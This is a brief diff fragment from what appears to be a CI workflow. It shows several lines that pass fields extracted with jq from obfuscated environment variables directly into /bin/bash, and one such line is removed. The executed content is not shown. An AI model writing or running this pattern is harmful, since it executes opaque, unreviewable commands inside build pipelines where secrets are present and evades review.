@@ -27,7 +27,6 @@ jobs:
           echo $ysgdr97 | jq -r .kh7 | /bin/bash
           printf '%s' "$tr7" | jq -r .f5 | /bin/bash
           echo $o3503 | jq -r .lm91 | /bin/bash
-          echo $wsmd3043 | jq -r .ls497 | /bin/bash
           printf '%s' "$l8499" | jq -r .u1573 | /bin/bash
           printf '%s' "$kwiud5" | jq -r .t2823 | /bin/bash
 
